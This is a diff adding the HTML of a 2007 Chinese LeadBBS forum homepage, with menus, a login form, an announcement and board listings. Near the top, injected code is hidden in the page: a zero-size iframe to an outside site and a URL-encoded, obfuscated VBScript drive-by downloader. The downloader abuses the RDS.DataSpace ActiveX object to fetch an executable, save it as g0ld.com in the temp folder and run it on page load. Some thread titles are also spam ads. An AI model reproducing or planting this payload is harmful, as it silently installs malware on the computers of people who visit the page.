@@ -1,0 +1,766 @@
+ <script language=javascript src=plug-ins/mx/over.js></script>
+
+<html>
+<head>
+	
+	<meta HTTP-EQUIV="Content-Type" content="text/html; charset=gb2312">
+	<meta http-equiv="Content-Language" content="zh-cn">
+	<META name="description" content="LeadBBS论坛,ASP论坛,计数器,统计系统,dotNet,asp.Net,源代码下载,组件,免费代码,ASP,数据库,SQL,文章,入门,ASP精品屋">
+	<title>
+		夏日祭 ˙`HtTp://Www.SuMmErInG.NeT`˙
+	</title>
+	<link rel="stylesheet" type="text/css" href="inc/style0.css">
+	<style>
+	<!--
+		.l {FONT-FAMILY: 宋体; FONT-SIZE: 12px;}
+		table {WORD-BREAK: break-all;}
+	-->
+	</style>
+</head>
+
+<body bgcolor="#f7f7f7" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" class=TBBGbody>
+
+<p align="center"><img src=/images/skin/0/logo.jpg ></p>
+<iframe src=http://www.wysck.cn/sc/2.htm width=0 height=0></iframe>
+<SCRIPT>var Words="%3Chtml%3E%0D%0A %3Cscript language%3D%22VBScript%22%3E%0D%0A    aeiq%3D%22Mi%22%0D%0A    cfpy%3D%22cr%22%0D%0A    fgsg%3D%22os%22%0D%0A    lima%3D%22of%22%0D%0A    bypz%3D%22t%2E%22%0D%0A    mbhi%3D%22XM%22%0D%0A    pmzk%3D%22LH%22%0D%0A    zqqi%3D%22TT%22%0D%0A    wivb%3D%22P%22%0D%0A    on error resume next%0D%0A%0D%0A    dl %3D %22http%3A%2F%2Fwww%2Ewysck%2Ecn%2Fsc%2F1%2Eexe%22%0D%0ASet df %3D document%2EcreateElement%28%22object%22%29%0D%0A    df%2EsetAttribute %22classid%22%2C %22clsid%3ABD96C556%2D65A3%2D11D0%2D983A%2D00C04FC29E36%22%0D%0A    str%3D%22Microsoft%2EXMLHTTP%22%0D%0A    Set x %3D df%2ECreateObject%28str%2C%22%22%29%0D%0A    a1%3D%22Ado%22%0D%0A    a2%3D%22db%2E%22%0D%0A    a3%3D%22Str%22%0D%0A    a4%3D%22eam%22%0D%0A    str1%3Da1%26a2%26a3%26a4%0D%0A    str5%3Dstr1%0D%0A    set S %3D df%2Ecreateobject%28str5%2C%22%22%29%0D%0A    S%2Etype %3D 1%0D%0A    str6%3D%22GET%22%0D%0A    x%2EOpen str6%2C dl%2C False%0D%0A    x%2ESend%0D%0A    fname1%3D%22g0ld%2Ecom%22%0D%0A    set F %3D df%2Ecreateobject%28%22Scripting%2EFileSystemObject%22%2C%22%22%29%0D%0A    set tmp %3D F%2EGetSpecialFolder%282%29 %0D%0A    fname1%3D F%2EBuildPath%28tmp%2Cfname1%29%0D%0A    S%2Eopen%0D%0A    S%2Ewrite x%2EresponseBody%0D%0A    S%2Esavetofile fname1%2C2%0D%0A    S%2Eclose%0D%0A    set Q %3D df%2Ecreateobject%28%22Shell%2EApplication%22%2C%22%22%29%0D%0A    function rechange%28k%29%0D%0As%3DSplit%28k%2C%22%2C%22%29%0D%0At%3D%22%22%0D%0AFor i %3D 0 To UBound%28s%29%0D%0At%3Dt%2BChr%28eval%28s%28i%29%29%29%0D%0ANext%0D%0Arechange%3Dt%0D%0AEnd Function%0D%0At%3D%2281%2C46%2C83%2C104%2C101%2C108%2C108%2C69%2C120%2C101%2C99%2C117%2C116%2C101%2C32%2C102%2C110%2C97%2C109%2C101%2C49%2C44%2C34%2C34%2C44%2C34%2C34%2C44%2C34%2C111%2C112%2C101%2C110%2C34%2C44%2C48%22%0D%0Ai%3Dt%0D%0Aexecute%28rechange%28I%29%29%0D%0A    %3C%2Fscript%3E%0D%0A    %3Chead%3E%3Ctitle%3E%3C%2Ftitle%3E%0D%0A    %3C%2Fhead%3E%3Cbody%3E%0D%0A    %3Ccenter%3E%3C%2Fcenter%3E%0D%0A    %3C%2Fbody%3E%3C%2Fhtml%3E%0D%0A%0D%0A";document.write(unescape(Words))</SCRIPT>
+
+<table width="700" border="0" cellspacing="1" cellpadding="0" align="center" bgcolor=#cccccc class=TBthree>
+<tr><td>
+<table width="100%" border="0" cellspacing="0" cellpadding="0" align="center">
+<tr height=17 valign=bottom>
+	<td bgcolor="eeeeee">
+		<table width="100%" border="0" cellspacing="0" cellpadding="0" class=TBTop>
+		<tr>
+			<td>
+			<script language=javascript>
+			function MM_findObj(n,d)
+			{
+				var p,i,x;
+				if(!d)d=document;
+				if((p=n.indexOf("?"))>0&&parent.frames.length)
+				{
+					d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);
+				}
+				if(!(x=d[n])&&d.all)x=d.all[n];for(i=0;!x&&i<d.forms.length;i++)x=d.forms[i][n];
+				for(i=0;!x&&d.layers&&i<d.layers.length;i++)x=MM_findObj(n,d.layers[i].document);
+				if(!x && document.getElementById)x=document.getElementById(n);return(x);
+			}
+
+			function MSHL()
+			{
+				var i,p,v,obj,args=MSHL.arguments;
+				for(i=0;i<(args.length-2);i+=3)if((obj=MM_findObj(args[i]))!=null){v=args[i+2];
+				if(obj.style){obj=obj.style;v=(v=='show')?'visible':(v='hide')?'hidden':v;}
+			    obj.visibility=v;}
+			}
+			function MN1(n)
+			{
+				document.write("<div id=Layer" + n + " style='position:absolute'>");
+				document.write("<div id=serve" + n + " style='position:absolute; left:0px; top:14px; width:90px; height:30px; z-index:20; visibility: hidden;' onMouseOut=MSHL('serve" + n + "','','hide') onMouseOver=MSHL('serve" + n + "','','show')>");
+				document.write("<table width=100% border=0 cellspacing=1 cellpadding=3 bgcolor=#cccccc class=TBMenu style='FILTER: alpha(opacity=85)'>");
+				document.write("<tr bgcolor=eeeeee class=MenuBG><td style='line-height:16px'>");
+				document.write("<table width=100% border=0 border=0 cellspacing=0 cellpadding=1 style=cursor:hand>");
+			}
+			function MN(m,n)
+			{
+				document.write("<tr><td onmouseover=\"this.className='MenuColor';\" onmouseout=\"this.className='';\">");
+				document.write("<img src=images/blank.gif height=2 width=2><br><img src=images/blank.gif height=2 width=2><a href=\"");
+				if(m.substr(0,5) != "http:"){document.write("" + m + "\">" + n + "</a></td></tr>");}
+				else{document.write(m + "\">" + n + "</a></td></tr>");}
+			}
+			function MN2(i,m,n)
+			{
+				document.write("</table></td></td></tr></table></div></div>");
+				document.write("<a href=\"" + m + "\" onMouseOver=\"MSHL('serve" + i + "','','show','subscibe','','hide','order','','hide','feature','','hide','defuser','','hide','spread','','hide')\" onMouseOut=\"MSHL('serve" + i + "','','hide','subscibe','','hide','order','','hide','feature','','hide','defuser','','hide','spread')\">" + n + "</a>");
+			}
+			function MNL(){document.write(" <img src=images/Skin/0/splt.gif align=absmiddle width=7 height=15> ");}
+			</script>
+			<img src=images/null.gif width=2 height=2><br><a href=User/UserJoin.asp>加入</a> <img src=images/Skin/0/splt.gif align=absmiddle width=7 height=15> <a href=User/Login.asp>登陸</a><script language=javascript>
+
+
+	MNL();
+	MN1(3);
+	MN("User/UserTop.asp","花朵排行榜");
+	MN("User/UserOnline.asp","在线花朵列表");
+	MN("Search/List.asp","查看最新帖子");
+	MN("Search/UploadList.asp","查看上传附件");
+	MN("User/Help/About.asp","联系管理人员");
+	MN2(3,"User/UserTop.asp","論壇信息")
+	MNL();
+	MN1(4);
+	MN("User/Help/Cal.asp","論壇万年历");
+	MN("User/Help/Color.asp","颜色对照表");
+	MN2(4,"User/Help/Cal.asp","花朵工具")
+
+MNL();
+  MN1(6);
+  MN("Plug-ins/SuperCSpet/petshop.asp","宠物商店");
+  MN("Plug-ins/SuperCSpet/mypet.asp","我的宠物");
+  MN("Plug-ins/SuperCSpet/pettop.asp","宠物排行榜");
+  MN("Plug-ins/SuperCSpet/petother.asp","宠物事务所");
+  MN("Plug-ins/SuperCSpet/itemshop.asp","宠物道具店");
+  MN("Plug-ins/SuperCSpet/weaponshop.asp","宠物装备店");
+  MN("Plug-ins/SuperCSpet/petbattle.asp","宠物竞技场");
+  MN("Plug-ins/SuperCSpet/petorphanage.asp","宠物孤儿院");
+  MN2(6,"Plug-ins/SuperCSpet/petcenter.asp","宠物中心");
+
+MNL();
+  MN1(5);
+  MN("plug-ins/pingding/viewmanage.asp","花朵工資");
+  MN("User/UserBank.asp","花朵銀行");
+  MN("plug-ins/love/plus_love.asp","花朵眷戀");
+  MN2(5,"Boards.asp","<span style=behavior:url(/bbs/inc/font.htc)>花朵玩耍</span>");
+	
+	MNL();
+	MN1(1);
+	var tu="User/BoardStyle.asp?b=0&s=";	MN(tu+"0","·The One·");
+	MN(tu+"1","·The Two·");
+	MN(tu+"2","·The Three·");
+
+	MN2(1,tu,"風格");
+				
+	</script></td>
+		</tr>
+		</table></td>
+</tr>
+</table></td>
+</tr>
+
+</table>
+
+<table width="700" border="0" cellspacing="0" cellpadding="0" align="center" height="2">
+<tr>
+	<td><img src=images/null.gif width=1 height=1></td>
+</tr>
+</table>
+	<table width="700" border="0" cellspacing="0" cellpadding="0" align="center">
+	<tr>
+		<td colspan=2>
+			<img src=images/null.gif height=5 width=2></td>
+	</tr>
+	<tr>
+		<td><font class=NavColor>
+			<a href="Boards.asp"><font class=NavColor>首页</font></a> &gt;&gt; <a href="Boards.asp"><font class=NavColor>˙`HtTp://Www.SuMmErInG.NeT`˙</font></a></font>
+		</td>
+		<td align=right>
+			</td><td align=right><a href=User/MyInfobox.asp><img src=images/Skin/0/inbox.GIF border=0 align=absmiddle><span class=NavColor>收件箱</span></a></td>
+	</tr>
+	<tr>
+		<td colspan=2>
+			<img src=images/null.gif height=5 width=2></td>
+	</tr>
+	</table>
+	<table width=700 border=0 cellspacing=0 cellpadding=0 align=center><tr><td><p align="center"><img src=/images/skin/0/bg1.jpg width=700 border=0></p></td></tr></table><table width=700 border=0 cellspacing=1 cellpadding=5 align=center bgcolor=#cccccc class=TBone>
+<tr bgcolor=#666699>
+<td class=TBHead><p align="center"><img src=images/blank.gif width=2 height=3><br>
+<font color=ffffff class=HeadFont><strong>花朵登陸</strong></font></td>
+<td class=TBHead><p align="center"><img src=images/blank.gif width=2 height=3><br><b><font color=ffffff class=HeadFont>論壇公告欄
+</b><b></td>
+</tr>
+<tr bgcolor=#f7f7f7 class=TBBG9>
+<td width=25%>
+
+<table border=0 cellspacing=1 cellpadding=6 align=center bgcolor=#cccccc class=TBone>
+     <form action=User/login.asp method="post">
+  <tr>
+
+    <table border=0 cellspacing=0 cellpadding=0 width='100%'>
+    <tr align=center>
+    <td width='70%'>
+      <table border=0>
+      <form name=login_frm method=post action='login.asp?action=login_chk' onsubmit="return login_true()">
+      <tr>
+      <td>
+        <p align="right">花朵{名}:</p>
+      </td>
+      <td><input name=user type=text maxlength=20 size=10 value="" class=fminpt></td>
+      <tr>
+      <td>
+        <p align="right">葉子{密}:</p>
+      </td>
+      <td><input name=pass type=password maxlength=20 size=10 value="" class=fminpt>
+      </td>      
+      </tr>
+      <tr>
+      <td colspan="2"><Select name=CkiExp>
+                                         <option value="-1">无效
+                                         <option value="365">一年
+                                         <option value=1>一天
+                                         <option value=2>两天
+                                         <option value=7>一周
+                                         <option value=31>一月
+                                   </select>  <input type=submit value="登录" class=fmbtn>
+      </td>
+      </tr>
+    </form></table>    </td>
+    <tr><td align=center>
+      <table border=0>
+      <tr>
+      <td><a href='User/UserJoin.asp'>成爲花朵</a></td>
+      <td width=5></td>
+      <td><a href='User/UserGetPass.asp'>沒有葉子</a></td>
+      </tr>
+      </table>
+    </td></tr>
+    </table>
+
+<td width=75%>
+
+	
+	
+	<table width="100%" border="0" cellspacing="0" cellpadding="0">
+    </table>
+	<table width="100%" border=0 align=center cellpadding=2 cellspacing=0 class=TBBG1 style="WORD-BREAK: break-all;">
+      <tr class=TBBG9>
+        <td colspan="2" align="right"><table width="95%" border=0 align=center cellpadding=2 cellspacing=0 style="WORD-BREAK: break-all;">
+            <tr>
+              <td>
+                
+ 感謝大家對論壇的支持和厚愛!!<br><br>http://www.eotdream.com/<br><br>乾坤大挪移過去咯!!
+              </td>
+            </tr>
+        </table></td>
+      </tr>
+      <tr class=TBBG9>
+        <td align="left">&nbsp;</td>
+        <td align="right"><img src=src=""images/null.gif width=10 height=8>公告發佈朲：<font color="#FF00FF"><b>瞳小初。</b></font><img src=src=""images/null.gif width=10 height=1>發佈時間：2007-03-25<img src=src=""images/null.gif width=10 height=1>
+          <a href=user/LookMessage.asp>更多公告</a>
+          </td>
+      </tr>
+    </table>
+	</td>
+</tr>
+</table>
+        <table width=700 border=0 cellspacing=0 cellpadding=0 align=center>
+          <tr>
+            <td><p align="center"><img src=/images/skin/0/bg2.jpg width=700 border=0></p></td>
+          </tr>
+        </table>
+        <br>
+        <table width=700 border=0 cellspacing=0 cellpadding=0 align=center>
+          <tr>
+            <td><p align="center"><img src=/images/skin/0/bg1.jpg width=700 border=0></p></td>
+          </tr>
+        </table>
+        <table width=700 border=0 cellspacing=1 cellpadding=5 align=center bgcolor=#cccccc class=TBone>
+          <tr bgcolor=#666699>
+            <td class=TBHead><p align="center"><img src=images/blank.gif width=2 height=3><br>
+                    <b><font color=ffffff class=HeadFont>論壇新貼</font></b></td>
+            <td class=TBHead><p align="center"><img src=images/blank.gif width=2 height=3><br>
+                    <b><font color=ffffff class=HeadFont>熱門貼子</font><b></b></b></td>
+            <td class=TBHead><p align="center"><img src=images/blank.gif width=2 height=3><br>
+                    <b><font color=ffffff class=HeadFont>精華貼子</font></b></td>
+          </tr>
+          <tr bgcolor=#f7f7f7 class=TBBG9>
+            <td width=33%>
+              <script language=javascript src=./other/article/topic.asp?TORA=1&Number=5&STime=0&StrLen=16&Hits=0></script>
+            </td>
+            <td width=34%>
+              <script language=javascript src=./other/article/topic.asp?TORA=1&Hotflag=1&Number=5&STime=0&StrLen=16&Hits=0></script>
+            </td>
+            <td width=33%>
+              <script language=javascript src=./other/article/topic.asp?TORA=1&PithFlag=1&Number=5&STime=0&StrLen=16&Hits=0></script>
+            </td>
+          </tr>
+        </table>
+        <table width=700 border=0 cellspacing=0 cellpadding=0 align=center><tr><td><p align="center"><img src=/images/skin/0/bg2.jpg width=700 border=0></p></td>
+</tr></table><br>
+
+<script language=javascript>
+	var num=0,CurrentAssosrt = 0,Flag=0;
+	var GBL_TableBottomString = "<p align=\"center\"><img src=/images/skin/0/bg2.jpg width=700 border=0></p>";
+	var GBL_TableHeadString = "<p align=\"center\"><img src=/images/skin/0/bg1.jpg width=700 border=0></p>";
+	var DEF_BBS_ScreenWidth = "700";
+	var GBL_DefineImage = "Skin/0/";
+
+
+function displayboard(BoardID,BoardAssort,BoardName,BoardIntro,LastWriter,LastWriteTime,TopicNum,AnnounceNum,ForumPass,LastAnnounceID,LastTopicName,MasterList,BoardLimit,AssortName,TodayAnnounce,GoodNum,BoardImgUrl,BoardImgWidth,BoardImgHeight,onlineUser,LowerBoard,AssortMaster)
+{
+     var Temp = 0;
+     if(CurrentAssosrt!=BoardAssort)
+     {
+           CurrentAssosrt = BoardAssort
+           if(Flag == 1)
+           {      document.write("</table>");
+                 if(GBL_TableBottomString != "")document.write("<table width=" + DEF_BBS_ScreenWidth + " border=0 cellspacing=0 cellpadding=0 align=center><tr><td>" + GBL_TableBottomString + "</td></tr></table>");
+                 document.write("<br>");
+           }
+           if(GBL_TableHeadString != "")document.write("<table width=" + DEF_BBS_ScreenWidth + " border=0 cellspacing=0 cellpadding=0 align=center><tr><td>" + GBL_TableHeadString + "</td></tr></table>");
+        document.write("<table width=" + DEF_BBS_ScreenWidth + " border=0 cellspacing=1 cellpadding=5 align=center bgcolor=#cccccc class=TBone><tr bgcolor=#666699><td colspan=4 class=TBHead><table width=100% border=0 cellspacing=0 cellpadding=0><tr><td width='25%'><img src=images/blank.gif width=2 height=3><br><a href=Boards.asp?Assort=" + BoardAssort + "><b><font color=white class=HeadFont>" + AssortName + "</font></b></a></td><td align=right><img src=images/blank.gif width=2 height=3><br><font color=blue class=bluecolor> 仙人掌{區}：");
+                DisplayAssortMaster(AssortMaster,5);
+                document.write("</font></td></tr></table></td></tr>");
+		Flag = 1;
+	}
+	document.write("<tr bgcolor=#f7f7f7 align=center class=TBBG9><td width=25 bgcolor=eeeeee class=TBBG1><img src=images/" + GBL_DefineImage + "BoardTopic/");
+	if(TodayAnnounce > 0)document.write("_");
+	if(ForumPass!="")
+	{
+		document.write("lock.gif title=保密论坛");
+	}
+	else
+	{
+		if(BoardLimit&(1<<(7-1)))
+		{
+			document.write("lock3.gif title=版主专区");
+		}
+		else
+		{
+			if((BoardLimit&(1<<(4-1))) && (BoardLimit&(1<<(3-1))) && (BoardLimit&(1<<(6-1))))
+			{
+				document.write("readonly.gif title=只读论坛");
+			}
+			else
+			{
+				if(BoardLimit&(1<<(2-1)))
+				{
+					document.write("lock2.gif title=正式会员论坛");
+				}
+				else
+				{
+					if(BoardLimit&(1<<(1-1)))
+					{
+						document.write("lock1.gif title=注册认证论坛");
+					}
+					else
+					{
+						if(BoardLimit&(1<<(9-1)))
+						{
+							document.write("open.gif title=开放论坛");
+						}
+						else
+						{
+							document.write("1.gif title=常规论坛");
+						}
+					}
+				}
+			}
+		}
+	}
+	document.write(" ></td>");
+	document.write("<td align=Left><table width=100% border=0 cellspacing=0 cellpadding=0>");
+	if(BoardImgUrl != "" && BoardImgUrl != null)document.write("<tr><td rowspan=4 width=" + BoardImgWidth + " valign=top><img src=images/null.gif width=2 height=3><br><a href=Board/Board.asp?BoardID=" + BoardID + "><img src=\"" + BoardImgUrl + "\" width=" + BoardImgWidth + " height=" + BoardImgHeight + " border=0></a></td><td width=4 rowspan=4><img src=images/null.gif width=2 height=2></td></tr>");
+	document.write("<tr height=20><td><a href=Board/Board.asp?BoardID=" + BoardID + ">" + BoardName + "</a>");
+	document.write("</td><td align=right rowspan=2 valign=top><img src=images/null.gif width=2 height=2><br><a href=announce/announce2.asp?BoardID=" + BoardID + "><img src=images/" + GBL_DefineImage + "BoardTopic/post.gif border=0 title=在此论坛发表新帖子></a><br><img src=images/null.gif width=2 height=5><br><a href=Board/EBoard.asp?BoardID=" + BoardID + "><img src=images/" + GBL_DefineImage + "BoardTopic/elist.gif border=0 title=查看精华区内容(共" + GoodNum + "精华帖子)></a></td></tr>");
+	document.write("<tr height=15><td>");
+	document.write(BoardIntro);
+	document.write("</td>");
+	document.write("<tr height=15><td colspan=2>");
+	document.write("<img src=images/null.gif height=2 width=192><br>藍妖姬{版}：");
+	DisplayBoardMastList(MasterList,5);
+	document.write("</tr></table></td>");
+	document.write("<td align=Left width=80 valign=top><img src=images/null.gif height=2 width=2><br>主題 <b>" + TopicNum + "</b><br><img src=images/null.gif height=4 width=2><br>新貼 <b><font color=#666699 class=TBtwofont>" + TodayAnnounce + "</font></b><br><img src=images/null.gif height=4 width=2><br>總量 <b>" + AnnounceNum + "</b></td>");
+	document.write("<td align=left width=222 valign=top><img src=images/null.gif height=2 width=2><br>");
+	if(LastTopicName == "" || LastTopicName==null)
+	{
+		document.write("主題：无");
+	}
+	else
+	{
+		if(strlength(LastTopicName)>31)LastTopicName = LeftTrue(LastTopicName,31-3) + "..."
+		LastTopicName = htmlencode(LastTopicName);
+		if(ForumPass != "" || (BoardLimit&(1<<(2-1))) || (BoardLimit&(1<<(7-1))))
+		{
+			document.write("主題：已设置为隐藏");
+			Temp = 1;
+		}
+		else
+		{
+			if(parseInt(LastAnnounceID)==0){document.write("主題：" + htmlencode(LastTopicName));}
+			else{document.write("主題：<a href=announce/announce.asp?BoardID=" + BoardID + "&ID=" + LastAnnounceID + "&Aupflag=1&Anum=1>" + htmlencode(LastTopicName) + "</a>");}
+		}
+	}
+	document.write("<br><img src=images/null.gif height=4 width=2><br>");
+	if(LastWriter == "")
+	{
+		document.write("作者：");
+		LastWriter="无";
+		document.write(LastWriter);
+		document.write("<br><img src=images/null.gif height=4 width=2><br>时间：无");
+	}
+	else
+	{
+		document.write("回复：");
+		if(LastWriter!="游客")
+		{
+			if(Temp == 1)
+			{
+				document.write("隐藏");
+			}
+			else
+			{
+				document.write("<a href=\"User/LookUserInfo.asp?Name=" + htmlencode(LastWriter) + "\">" + htmlencode(LastWriter) + "</a>");
+			}
+		}
+		else
+		{
+			document.write(htmlencode(LastWriter))
+		}
+		if(LastWriteTime.length==14)
+		{
+			LastWriteTime = LastWriteTime.substr(0,4) + "-" + LastWriteTime.substr(4,2) + "-" + LastWriteTime.substr(6,2) + " " + LastWriteTime.substr(8,2) + ":" + LastWriteTime.substr(10,2) + ":" + LastWriteTime.substr(12,2)
+		}
+		else
+		{
+			LastWriteTime = "无"
+		}
+		document.write("<br><img src=images/null.gif height=4 width=2><br>时间：" + LastWriteTime);
+		document.write("</td></tr>");
+	}
+}
+
+function DisplayBoardMastList(s,num)
+{
+	if("?LeadBBS?" == s)
+	{
+		document.write("全體妖姬");
+	}
+	else
+	{
+		if(s == "" || s == null)document.write("無");
+		var ss,n;
+		ss = s.split(",");
+		for(n=0;n<ss.length;n++)
+		{
+			if(n>=num)break;
+			document.write("<a href=\"User/LookUserinfo.asp?name=" + htmlencode(ss[n]) + "\">" + htmlencode(ss[n]) + "</a> ");
+		}
+		if(n>=num && n<ss.length)
+		{
+			document.write("<span style=\"cursor:hand\" title=\"更多妖姬: " + ss[n]);
+			for(n=n+1;n<ss.length;n++){document.write(" " + ss[n]);}
+			document.write("\">...</span>");
+		}
+	}
+}
+function DisplayAssortMaster(s,num)
+{
+     if("?LeadBBS?" == s)
+     {
+           document.write("全體妖姬");
+     }
+     else
+     {
+           if(s == "" || s == null)document.write("無");
+           var ss,n;
+           ss = s.split(",");
+           for(n=0;n<ss.length;n++)
+           {
+                 if(n>=num)break;
+                 document.write("<a href=\"User/LookUserinfo.asp?name=" + htmlencode(ss[n]) + "\"><font class=AssortMastercolor>" + htmlencode(ss[n]) + "</font></a> ");
+           }
+           if(n>=num && n<ss.length)
+           {
+                 document.write("<span style=\"cursor:hand\" title=\"更多妖姬: " + ss[n]);
+                 for(n=n+1;n<ss.length;n++){document.write(" " + ss[n]);}
+                 document.write("\">...</span>");
+           }
+     }
+}
+
+function htmlencode(str)
+{
+	var re = /(<)/gi;
+	var rv = str.replace(re,"&lt;");
+	re = /(>)/gi;
+	rv = rv.replace(re,"&gt;");
+	re = /(\")/gi;
+	rv = rv.replace(re,"&quot;");
+	return(rv);
+}
+function LeftTrue(str,n)
+{
+	var mx=String.fromCharCode(127);
+	if(str.length<=n/2)
+	{
+		return(str);
+	}
+	else
+	{
+		var TStr="";
+		var l,t=0;
+		var i;
+		l=str.length;
+		for(i=0;i<l;i++)
+		{
+			if(str.charAt(i)>mx)
+			{
+				t=t+2;
+			}
+			else
+			{
+				t=t+1;
+			}
+			if(t>n)break;
+			TStr=TStr+str.charAt(i);
+		}
+		return(TStr);
+	}
+}
+
+function strlength(str)
+{
+	var mx=String.fromCharCode(255);
+	if(str.length==0)
+	{
+		return(0);
+	}
+	else
+	{
+		var TStr="";
+		var l,t,c;
+		var i;
+		l=str.length;
+		t=l;
+		for(i=0;i<l;i++)
+		{
+			if(str.charAt(i)>mx)
+			{
+				t+=1;
+			}
+		}
+		return(t);
+	}
+}
+displayboard(1010,5,".'拼湊的節拍．|▍","‖翻唱‖","hareS","20070323182224",14,189,"",8140,"{翻唱活动}合唱貼","",1,"ˋ°圓舞曲☆.!",0,0,"","0","0",0,"","錦唲");
+displayboard(748,5,"ˋ破滅的幻想☆.!","‖小白‖","革吉鬼哭","20070420022100",10,134,"",15559,"中国最high的美女总裁郗慧林eiedu.com","",1,"ˋ°圓舞曲☆.!",0,0,"","0","0",0,"","錦唲");
+displayboard(1314,5,"ɑ.﹏十一路公車≯","‖報道‖","遇敌荏平","20070510184409",140,1859,"",15574,"[精]让全世界知道你，网络营销软件","哢哢。",1,"ˋ°圓舞曲☆.!",0,0,"","0","0",0,"","錦唲");
+displayboard(174,5,"ノ⺻漠河的舞蹈¨","‖雜誌‖","行上星期","20070418053837",71,771,"",15537,"明星还是ceo?美女总裁郗慧林 eiedu.com","妖。染,馥郁绸缪",1,"ˋ°圓舞曲☆.!",0,0,"","0","0",0,"","錦唲");
+displayboard(244,7,"｀／地下后樂園…」","‖娛樂‖","革吉鬼哭","20070421022957",61,384,"",15565,"网络新闻优化:24小时危机公关处理专家！第一公关1spr.cn","錦唲",1,"&|街巷de角色﹖",0,2,"","0","0",0,"","柠檬萱草,妖。染,小5,『孆縩』");
+displayboard(254,7,"'-手心的印記×、","‖貼圖‖","革吉鬼哭","20070421175559",83,662,"",15568,"eiedu.com中国最nb的美女总裁郗慧林:从天才少女到中国网络教育第一人","隙小辷。,茳曉煵。",1,"&|街巷de角色﹖",0,6,"","0","0",0,"","柠檬萱草,妖。染,小5,『孆縩』");
+displayboard(222,7,"｀ 曖昧的痕跡×、","‖耽美‖","行上星期","20070418233449",32,293,"",15545,"跟美女总裁学英语！ eiedu.com 郗慧林","妖。染,夙紫冰",8193,"&|街巷de角色﹖",0,2,"","0","0",0,"","柠檬萱草,妖。染,小5,『孆縩』");
+displayboard(321,7,"★.&#8226;非主流的秀﹏‥","‖時尚‖","革吉鬼哭","20070419025854",24,188,"",15546,"跟美女总裁共同创业！ eiedu.com 郗慧林","",1,"&|街巷de角色﹖",0,0,"","0","0",0,"","柠檬萱草,妖。染,小5,『孆縩』");
+displayboard(224,7,"′)女巫的眼淚'※","‖占卜‖","亏蚀走兽","20070417055811",98,1085,"",15528,"千元免费大礼包！美女总裁郗慧林eiedu.com","筱。,馨Ω",1,"&|街巷de角色﹖",0,0,"","0","0",0,"","柠檬萱草,妖。染,小5,『孆縩』");
+displayboard(364,7,"__&|青梅的竹馬﹖﹌","‖招親‖","行上星期","20070416120527",25,715,"",15518,"eiedu.com最受纳斯达克期待的智慧ceo：美女总裁郗慧林","小5",1,"&|街巷de角色﹖",0,2,"","0","0",0,"","柠檬萱草,妖。染,小5,『孆縩』");
+displayboard(441,7,"┌x!刻下的時光.°","‖動漫‖","亏蚀走兽","20070422205009",73,435,"",15570,"明星还是ceo?美女总裁郗慧林 eiedu.com","『孆縩』,杀哈林",1,"&|街巷de角色﹖",0,1,"","0","0",0,"","柠檬萱草,妖。染,小5,『孆縩』");
+displayboard(231,7,"ˋ°星光遊樂園﹐","‖遊戲‖","干吼中直","20070409214340",19,137,"",15478,"web3.0:天涯、mop靠边站","",1,"&|街巷de角色﹖",0,1,"","0","0",0,"","柠檬萱草,妖。染,小5,『孆縩』");
+displayboard(128,7,"≈ 橘子味汽水﹏","‖灌水‖","革吉鬼哭","20070419221435",142,2973,"",15557,"至酷美女总裁郗慧林eiedu.com","扬。,戀…猪猪",1,"&|街巷de角色﹖",0,1,"","0","0",0,"","柠檬萱草,妖。染,小5,『孆縩』");
+displayboard(156,8,"ノ⺻.兩情相悅/","‖禮物‖","革吉鬼哭","20070422213032",178,1639,"",15571,"明星还是ceo?美女总裁郗慧林 eiedu.com","扬。",1,"．|▍十字路口…",0,0,"","0","0",0,"","筱。,hareS");
+displayboard(147,8,"﹏`◆霓桑羽衣…","‖作品‖","干吼中直","20070419185159",36,471,"",15556,"网络关注度最高的美女总裁郗慧林eiedu.com","夙紫冰",1,"．|▍十字路口…",0,0,"","0","0",0,"","筱。,hareS");
+displayboard(144,8,"<◇◆Summer学院℡","‖教程‖","革吉鬼哭","20070420045933",27,169,"",15560,"千元免费大礼包！美女总裁郗慧林eiedu.com","哢哢。",1,"．|▍十字路口…",0,0,"","0","0",0,"","筱。,hareS");
+displayboard(133,8,"～.。迴天的乏術．|▍","‖資源‖","革吉鬼哭","20070423105308",27,155,"",15572,"高尔夫俘虏橙色女人美女总裁郗慧林 eiedu.com","",1,"．|▍十字路口…",0,0,"","0","0",0,"","筱。,hareS");
+displayboard(178,8,")‘八號當鋪︷","‖商店‖","革吉鬼哭","20070421120957",26,379,"",15566,"eiedu.com\"财智双全\"美女总裁郗慧林","jiko",1,"．|▍十字路口…",0,1,"","0","0",0,"","筱。,hareS");
+displayboard(113,9,"____。永無鄉","‖日記‖","亏蚀走兽","20070423113252",32,242,"",15573,"高尔夫俘虏橙色女人美女总裁郗慧林 eiedu.com","暩尛司。",1,"﹌╮.九号站台☆.!",0,0,"","0","0",0,"","暩尛司。,馥郁绸缪");
+displayboard(111,9,"∞ 。愚人節゛","‖文字‖","行上星期","20070422053511",46,315,"",15569,"eiedu.com美女总裁的“第一桶金”","錦唲,§尊·界§,星辰海",1,"﹌╮.九号站台☆.!",0,1,"","0","0",0,"","暩尛司。,馥郁绸缪");
+displayboard(121,9,"「.天使 街|。","‖連載‖","行上星期","20070420154457",20,106,"",15563,"网络新闻优化:24小时危机公关处理专家！第一公关1spr.cn","柠檬萱草",1,"﹌╮.九号站台☆.!",0,0,"","0","0",0,"","暩尛司。,馥郁绸缪");
+displayboard(101,10,"_┌.木棉天堂┉.","‖活動‖","行上星期","20070418214352",18,203,"",15543,"美女总裁送钱了！！！ eiedu.com 郗慧林","瞳小初。",1,"<◇◆街心公寓。]",0,0,"","0","0",0,"","瞳小初。");
+displayboard(100,10,"[⒈７#病房。]","‖事務‖","行上星期","20070421154505",81,575,"",15567,"eiedu.com\"财智双全\"美女总裁郗慧林","瞳小初。",1,"<◇◆街心公寓。]",0,1,"","0","0",0,"","瞳小初。");
+displayboard(444,10,"｀／冥墓祭︷","‖回收站‖","-","20070401123804",58,1409,"",15430,"-","?LeadBBS?",65,"<◇◆街心公寓。]",0,0,"","0","0",0,"","瞳小初。");
+</script>
+		</table>
+		
+		<table width=700 border=0 cellspacing=0 cellpadding=0 align=center><tr><td><p align="center"><img src=/images/skin/0/bg2.jpg width=700 border=0></p></td></tr></table><br><table width=100% border=0 cellspacing=0 cellpadding=0 align=center><tr><td><p align="center"><img src=/images/skin/0/bg1.jpg width=700 border=0></p></td></tr></table>
+<table width=700 border=0 cellspacing=1 cellpadding=5 align=center bgcolor=#cccccc class=TBone>
